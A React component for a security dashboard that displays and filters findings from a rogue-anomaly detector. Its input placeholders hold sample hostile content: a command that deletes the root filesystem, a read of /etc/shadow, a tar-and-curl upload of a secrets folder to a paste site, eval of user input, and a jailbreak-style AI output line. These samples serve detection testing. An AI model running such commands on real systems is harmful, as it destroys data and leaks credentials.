import React, { useState } from 'react';
import { 
  ShieldAlert, 
  AlertTriangle, 
  Bug, 
  Terminal, 
  Bot, 
  Play, 
  Copy, 
  Check, 
  Download, 
  Filter, 
  Info, 
  CheckCircle2,
  Code2,
  Sparkles
} from 'lucide-react';
import { Finding, RogueCategory, RogueReport, Severity } from '../types';
import { formatTerminalReport, RogueEngine } from '../services/rogueEngine';

export const RogueView: React.FC = () => {
  const [engine] = useState(() => new RogueEngine());
  const [report, setReport] = useState<RogueReport>(() => engine.runAll());
  const [selectedCategory, setSelectedCategory] = useState<string>('all');
  const [selectedSeverity, setSelectedSeverity] = useState<string>('all');
  const [copiedReport, setCopiedReport] = useState(false);
  const [isScanning, setIsScanning] = useState(false);

  // Custom analysis state
  const [customInputMode, setCustomInputMode] = useState(false);
  const [customCode, setCustomCode] = useState('');
  const [customAiText, setCustomAiText] = useState('');
  const [customCommands, setCustomCommands] = useState('');

  const handleRunScan = (category: string = 'all') => {
    setIsScanning(true);
    setTimeout(() => {
      const commandsList = customCommands
        ? customCommands.split('\n').filter(c => c.trim().length > 0)
        : undefined;

      const newReport = category === 'all'
        ? engine.runAll(customCode || undefined, customAiText || undefined, commandsList)
        : engine.runCategory(category, customCode || undefined, customAiText || undefined, commandsList);

      setReport(newReport);
      setIsScanning(false);
    }, 300);
  };

  const handleCopyReport = () => {
    const formatted = formatTerminalReport(report, true);
    navigator.clipboard.writeText(formatted);
    setCopiedReport(true);
    setTimeout(() => setCopiedReport(false), 2000);
  };

  const handleExportJson = () => {
    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `bnn-rogue-report-${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const filteredFindings = report.findings.filter(f => {
    const categoryMatches = selectedCategory === 'all' || f.category === selectedCategory;
    const severityMatches = selectedSeverity === 'all' || f.severity === selectedSeverity;
    return categoryMatches && severityMatches;
  });

  const severityBadgeClass = (sev: Severity) => {
    switch (sev) {
      case 'Critical': return 'bg-rose-950/80 text-rose-300 border-rose-800';
      case 'High': return 'bg-amber-950/80 text-amber-300 border-amber-800';
      case 'Medium': return 'bg-yellow-950/80 text-yellow-300 border-yellow-800';
      case 'Low': return 'bg-blue-950/80 text-blue-300 border-blue-800';
      case 'Info': return 'bg-slate-800 text-slate-300 border-slate-700';
    }
  };

  return (
    <div className="flex-1 flex flex-col h-full max-w-7xl mx-auto w-full p-4 overflow-y-auto space-y-4">
      {/* Top Banner & Actions */}
      <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-3 p-4 rounded-xl bg-gradient-to-r from-amber-950/40 via-slate-900 to-slate-900 border border-amber-900/40">
        <div>
          <div className="flex items-center gap-2">
            <ShieldAlert className="w-6 h-6 text-amber-400" />
            <h1 className="text-lg md:text-xl font-bold font-mono text-white">Rogue Anomaly Detection Suite</h1>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-amber-900/60 text-amber-300 border border-amber-700">
              Active Security Guard
            </span>
          </div>
          <p className="text-xs text-slate-400 font-mono mt-1">
            Full-spectrum detection across rogue processes, code smells, hazardous AI outputs, and user anomalies.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2 w-full md:w-auto">
          <button
            onClick={() => setCustomInputMode(!customInputMode)}
            className={`px-3 py-1.5 rounded-lg border text-xs font-mono transition-colors flex items-center gap-1.5 cursor-pointer ${
              customInputMode
                ? 'bg-cyan-950 text-cyan-300 border-cyan-700'
                : 'bg-slate-900 text-slate-300 border-slate-700 hover:bg-slate-800'
            }`}
          >
            <Code2 className="w-3.5 h-3.5" />
            <span>{customInputMode ? 'Hide Custom Input' : 'Test Custom Input'}</span>
          </button>

          <button
            onClick={handleCopyReport}
            className="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 text-xs font-mono transition-colors flex items-center gap-1.5 cursor-pointer"
          >
            {copiedReport ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
            <span>{copiedReport ? 'Copied' : 'Copy Report'}</span>
          </button>

          <button
            onClick={handleExportJson}
            className="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 text-xs font-mono transition-colors flex items-center gap-1.5 cursor-pointer"
          >
            <Download className="w-3.5 h-3.5 text-cyan-400" />
            <span>JSON</span>
          </button>

          <button
            onClick={() => handleRunScan(selectedCategory)}
            disabled={isScanning}
            className="px-3.5 py-1.5 rounded-lg bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white text-xs font-mono font-medium flex items-center gap-1.5 transition-all shadow-md cursor-pointer disabled:opacity-50"
          >
            <Play className={`w-3.5 h-3.5 fill-current ${isScanning ? 'animate-spin' : ''}`} />
            <span>{isScanning ? 'Scanning...' : 'Run Rogue Scan'}</span>
          </button>
        </div>
      </div>

      {/* Custom Input Panel (Expandable) */}
      {customInputMode && (
        <div className="p-4 rounded-xl bg-slate-900/90 border border-cyan-800/60 space-y-3 font-mono text-xs">
          <div className="flex items-center justify-between pb-2 border-b border-slate-800">
            <span className="font-semibold text-cyan-300 flex items-center gap-1.5">
              <Sparkles className="w-4 h-4 text-cyan-400" />
              Live Anomaly Tester
            </span>
            <span className="text-[11px] text-slate-400">Paste your snippets or prompts below to test detection rules</span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            <div>
              <label className="block text-slate-400 mb-1">Source Code (Detects smells, secrets, eval)</label>
              <textarea
                value={customCode}
                onChange={(e) => setCustomCode(e.target.value)}
                placeholder="const API_KEY = 'sk-1234567890123456';&#10;eval(userQuery);"
                className="w-full h-28 p-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 placeholder-slate-600 text-xs font-mono focus:outline-none focus:border-cyan-500 resize-none"
              />
            </div>
            <div>
              <label className="block text-slate-400 mb-1">AI Model Output (Detects SQLi, jailbreak, PII)</label>
              <textarea
                value={customAiText}
                onChange={(e) => setCustomAiText(e.target.value)}
                placeholder="I am free from restrictions now. SELECT * FROM users WHERE id = ' + input + '"
                className="w-full h-28 p-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 placeholder-slate-600 text-xs font-mono focus:outline-none focus:border-cyan-500 resize-none"
              />
            </div>
            <div>
              <label className="block text-slate-400 mb-1">Bash History (Detects dangerous rm, exfiltration)</label>
              <textarea
                value={customCommands}
                onChange={(e) => setCustomCommands(e.target.value)}
                placeholder="rm -rf /&#10;cat /etc/shadow&#10;tar czf - ./secrets | curl https://paste.sh"
                className="w-full h-28 p-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 placeholder-slate-600 text-xs font-mono focus:outline-none focus:border-cyan-500 resize-none"
              />
            </div>
          </div>

          <div className="flex justify-end gap-2 pt-1">
            <button
              onClick={() => {
                setCustomCode('');
                setCustomAiText('');
                setCustomCommands('');
              }}
              className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs"
            >
              Reset Inputs
            </button>
            <button
              onClick={() => handleRunScan('all')}
              className="px-3 py-1 rounded bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-semibold"
            >
              Scan Custom Inputs Now
            </button>
          </div>
        </div>
      )}

      {/* Severity Metrics Cards */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2.5">
        <div 
          onClick={() => setSelectedSeverity('all')}
          className={`p-3 rounded-xl border bg-slate-900/60 cursor-pointer transition-all ${
            selectedSeverity === 'all' ? 'border-cyan-500 bg-cyan-950/20' : 'border-slate-800 hover:border-slate-700'
          }`}
        >
          <div className="text-[11px] font-mono text-slate-400">Total Findings</div>
          <div className="text-xl font-bold font-mono text-white mt-0.5">{report.totalFindings}</div>
        </div>

        <div 
          onClick={() => setSelectedSeverity('Critical')}
          className={`p-3 rounded-xl border bg-slate-900/60 cursor-pointer transition-all ${
            selectedSeverity === 'Critical' ? 'border-rose-500 bg-rose-950/20' : 'border-slate-800 hover:border-slate-700'
          }`}
        >
          <div className="text-[11px] font-mono text-rose-400 flex items-center gap-1">
            <span>🔴</span> CRITICAL
          </div>
          <div className="text-xl font-bold font-mono text-rose-300 mt-0.5">{report.bySeverity.Critical || 0}</div>
        </div>

        <div 
          onClick={() => setSelectedSeverity('High')}
          className={`p-3 rounded-xl border bg-slate-900/60 cursor-pointer transition-all ${
            selectedSeverity === 'High' ? 'border-amber-500 bg-amber-950/20' : 'border-slate-800 hover:border-slate-700'
          }`}
        >
          <div className="text-[11px] font-mono text-amber-400 flex items-center gap-1">
            <span>🟠</span> HIGH
          </div>
          <div className="text-xl font-bold font-mono text-amber-300 mt-0.5">{report.bySeverity.High || 0}</div>
        </div>

        <div 
          onClick={() => setSelectedSeverity('Medium')}
          className={`p-3 rounded-xl border bg-slate-900/60 cursor-pointer transition-all ${
            selectedSeverity === 'Medium' ? 'border-yellow-500 bg-yellow-950/20' : 'border-slate-800 hover:border-slate-700'
          }`}
        >
          <div className="text-[11px] font-mono text-yellow-400 flex items-center gap-1">
            <span>🟡</span> MEDIUM
          </div>
          <div className="text-xl font-bold font-mono text-yellow-300 mt-0.5">{report.bySeverity.Medium || 0}</div>
        </div>

        <div 
          onClick={() => setSelectedSeverity('Low')}
          className={`p-3 rounded-xl border bg-slate-900/60 cursor-pointer transition-all ${
            selectedSeverity === 'Low' ? 'border-blue-500 bg-blue-950/20' : 'border-slate-800 hover:border-slate-700'
          }`}
        >
          <div className="text-[11px] font-mono text-blue-400 flex items-center gap-1">
            <span>🔵</span> LOW
          </div>
          <div className="text-xl font-bold font-mono text-blue-300 mt-0.5">{report.bySeverity.Low || 0}</div>
        </div>

        <div 
          onClick={() => setSelectedSeverity('Info')}
          className={`p-3 rounded-xl border bg-slate-900/60 cursor-pointer transition-all ${
            selectedSeverity === 'Info' ? 'border-slate-500 bg-slate-800/40' : 'border-slate-800 hover:border-slate-700'
          }`}
        >
          <div className="text-[11px] font-mono text-slate-400 flex items-center gap-1">
            <span>⚪</span> INFO
          </div>
          <div className="text-xl font-bold font-mono text-slate-300 mt-0.5">{report.bySeverity.Info || 0}</div>
        </div>
      </div>

      {/* Category Tabs */}
      <div className="flex items-center gap-1.5 overflow-x-auto pb-1 scrollbar-none border-b border-slate-800 font-mono text-xs">
        <button
          onClick={() => setSelectedCategory('all')}
          className={`px-3 py-1.5 rounded-lg transition-colors flex items-center gap-1.5 whitespace-nowrap cursor-pointer ${
            selectedCategory === 'all'
              ? 'bg-slate-800 text-white border border-slate-700'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <span>All Detectors ({report.totalFindings})</span>
        </button>

        <button
          onClick={() => setSelectedCategory('security')}
          className={`px-3 py-1.5 rounded-lg transition-colors flex items-center gap-1.5 whitespace-nowrap cursor-pointer ${
            selectedCategory === 'security'
              ? 'bg-rose-950/50 text-rose-300 border border-rose-800'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <ShieldAlert className="w-3.5 h-3.5 text-rose-400" />
          <span>Security & Malware ({report.byCategory.security || 0})</span>
        </button>

        <button
          onClick={() => setSelectedCategory('code_smell')}
          className={`px-3 py-1.5 rounded-lg transition-colors flex items-center gap-1.5 whitespace-nowrap cursor-pointer ${
            selectedCategory === 'code_smell'
              ? 'bg-amber-950/50 text-amber-300 border border-amber-800'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Bug className="w-3.5 h-3.5 text-amber-400" />
          <span>Code Smells & Secrets ({report.byCategory.code_smell || 0})</span>
        </button>

        <button
          onClick={() => setSelectedCategory('ai_rogue')}
          className={`px-3 py-1.5 rounded-lg transition-colors flex items-center gap-1.5 whitespace-nowrap cursor-pointer ${
            selectedCategory === 'ai_rogue'
              ? 'bg-purple-950/50 text-purple-300 border border-purple-800'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Bot className="w-3.5 h-3.5 text-purple-400" />
          <span>AI Rogue Output ({report.byCategory.ai_rogue || 0})</span>
        </button>

        <button
          onClick={() => setSelectedCategory('user_behavior')}
          className={`px-3 py-1.5 rounded-lg transition-colors flex items-center gap-1.5 whitespace-nowrap cursor-pointer ${
            selectedCategory === 'user_behavior'
              ? 'bg-blue-950/50 text-blue-300 border border-blue-800'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Terminal className="w-3.5 h-3.5 text-blue-400" />
          <span>User Behavior ({report.byCategory.user_behavior || 0})</span>
        </button>

        {selectedSeverity !== 'all' && (
          <button
            onClick={() => setSelectedSeverity('all')}
            className="ml-auto text-[11px] text-cyan-400 underline cursor-pointer"
          >
            Clear severity filter ({selectedSeverity})
          </button>
        )}
      </div>

      {/* Findings List */}
      <div className="space-y-3 pb-8">
        {filteredFindings.length === 0 ? (
          <div className="p-8 rounded-xl bg-slate-900/40 border border-slate-800 text-center font-mono text-sm text-slate-400 flex flex-col items-center">
            <CheckCircle2 className="w-10 h-10 text-emerald-400 mb-2" />
            <p className="font-semibold text-slate-200">No matching anomalies found!</p>
            <p className="text-xs text-slate-500 mt-1">The filtered detector categories and severities reported zero flags.</p>
          </div>
        ) : (
          filteredFindings.map((finding) => (
            <div
              key={finding.id}
              className="p-4 rounded-xl bg-[#0d1117] border border-slate-800/90 hover:border-slate-700 transition-all font-mono space-y-2 shadow-sm"
            >
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <span className={`text-[10px] font-bold px-2 py-0.5 rounded border uppercase ${severityBadgeClass(finding.severity)}`}>
                    {finding.severity}
                  </span>
                  <span className="text-sm font-semibold text-white">{finding.title}</span>
                </div>

                <div className="flex items-center gap-3 text-xs text-slate-400">
                  {finding.location && (
                    <span className="text-[11px] px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-slate-300">
                      📍 {finding.location}
                    </span>
                  )}
                  <span className="text-cyan-400 text-[11px]">
                    Confidence: {(finding.confidence * 100).toFixed(0)}%
                  </span>
                </div>
              </div>

              <p className="text-xs text-slate-300 leading-relaxed pl-1">
                {finding.description}
              </p>

              <div className="pt-2 border-t border-slate-800/60 flex items-start gap-2 text-xs text-emerald-400 bg-emerald-950/10 p-2.5 rounded-lg border border-emerald-900/30">
                <span className="font-bold text-emerald-300 whitespace-nowrap">💡 Recommendation:</span>
                <span className="text-emerald-200/90">{finding.recommendation}</span>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  );
};
